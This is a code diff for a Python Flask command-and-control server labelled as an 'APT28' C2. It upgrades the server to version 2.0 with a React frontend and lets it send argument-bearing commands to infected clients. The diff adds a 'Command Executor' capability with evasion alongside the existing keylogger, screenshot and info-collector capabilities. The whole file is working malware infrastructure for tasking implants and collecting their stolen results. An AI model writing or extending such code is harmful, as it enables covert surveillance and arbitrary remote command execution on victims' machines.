@@ -1,9 +1,10 @@
 """
 C2 (Command and Control) Server Implementation in Python
 APT28 - Advanced Persistent Threat Group
+Docker-Only Deployment with React Frontend
 """
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
 from flask_cors import CORS
 from datetime import datetime
 import json
@@ -15,7 +16,7 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # Initialize Flask app
-app = Flask(__name__)
+app = Flask(__name__, static_folder='static', static_url_path='')
 CORS(app)
 
 # Configure logging
@@ -31,7 +32,7 @@ logger = logging.getLogger(__name__)
 
 # Data structures
 clients = {}          # Store registered clients with metadata
-commands = {}         # Store pending commands per client
+commands = {}         # Store pending commands per client: {client_id: {"capability": int, "args": str}}
 results = []          # Store execution results
 client_capabilities = {}  # Store capabilities status per client
 
@@ -43,6 +44,7 @@ CAPABILITIES = {
     3: "Keylogger (start_keylogger)",
     4: "Screenshot (start_screenshot)",
     5: "Info Collector (start_info_collector)",
+    6: "Command Executor (execute_command_with_evasion)",
 }
 
 
@@ -68,7 +70,7 @@ def register():
     }
     
     # Initialize command queue
-    commands[client_id] = 0  # No command by default
+    commands[client_id] = {"capability": 0, "args": ""}  # No command by default
     client_capabilities[client_id] = {}
     
     logger.info(f"[+] Client registered: {client_id} from {request.remote_addr}")
@@ -99,16 +101,17 @@ def get_command():
         logger.warning(f"Command request from unregistered client: {client_id}")
         return "0", 404
     
-    cmd = commands.get(client_id, 0)
+    cmd = commands.get(client_id, {"capability": 0, "args": ""})
     
-    if cmd != 0:
-        logger.info(f"[*] Capability command sent to {client_id}: {cmd} ({CAPABILITIES.get(cmd, 'Unknown')})")
+    if cmd["capability"] != 0:
+        logger.info(f"[*] Capability command sent to {client_id}: {cmd['capability']} ({CAPABILITIES.get(cmd['capability'], 'Unknown')}) with args: {cmd['args']}")
         # Reset command to 0 after client fetches it
-        commands[client_id] = 0
+        commands[client_id] = {"capability": 0, "args": ""}
     else:
         logger.debug(f"[*] No pending command for {client_id}")
     
-    return str(cmd), 200
+    # Return JSON with capability and args
+    return jsonify(cmd), 200
 
 
 @app.route('/api/report', methods=['POST'])
@@ -150,7 +153,7 @@ def report():
         
         # Clear command after execution
         if client_id in commands:
-            commands[client_id] = 0
+            commands[client_id] = {"capability": 0, "args": ""}
         
         logger.info(f"[+] Result from {client_id} - Capability {capability} ({CAPABILITIES.get(capability, 'Unknown')}): {result[:50]}...")
         
@@ -204,6 +207,7 @@ def send_command():
         
         client_id = data.get('client_id')
         capability_id = data.get('capability_id')
+        args = data.get('args', '')  # Optional arguments
         
         if not client_id or capability_id is None:
             return jsonify({"status": "error", "message": "client_id and capability_id required"}), 400
@@ -214,15 +218,16 @@ def send_command():
         if client_id not in clients:
             return jsonify({"status": "error", "message": "Client not found"}), 404
         
-        commands[client_id] = capability_id
-        logger.info(f"[*] Assigned capability {capability_id} ({CAPABILITIES[capability_id]}) to {client_id}")
+        commands[client_id] = {"capability": capability_id, "args": args}
+        logger.info(f"[*] Assigned capability {capability_id} ({CAPABILITIES[capability_id]}) to {client_id} with args: {args}")
         
         return jsonify({
             "status": "success",
             "message": f"Capability {capability_id} assigned to {client_id}",
             "client_id": client_id,
             "capability_id": capability_id,
-            "capability_name": CAPABILITIES[capability_id]
+            "capability_name": CAPABILITIES[capability_id],
+            "args": args
         }), 200
         
     except Exception as e:
@@ -281,12 +286,32 @@ def health():
 @app.route('/', methods=['GET'])
 def index():
     """
-    Index page with C2 server information
+    Serve React frontend
+    """
+    return send_from_directory(app.static_folder, 'index.html')
+
+
+@app.route('/<path:path>', methods=['GET'])
+def serve_static(path):
+    """
+    Serve static files for React frontend
+    """
+    if path and os.path.exists(os.path.join(app.static_folder, path)):
+        return send_from_directory(app.static_folder, path)
+    else:
+        return send_from_directory(app.static_folder, 'index.html')
+
+
+@app.route('/api/', methods=['GET'])
+def api_index():
+    """
+    API index with C2 server information
     """
     return jsonify({
         "name": "APT28 C2 Server",
-        "version": "1.0.0",
+        "version": "2.0.0",
         "status": "running",
+        "deployment": "docker-only",
         "timestamp": datetime.now().isoformat(),
         "endpoints": {
             "register": "GET /api/register?id=<client_id>",
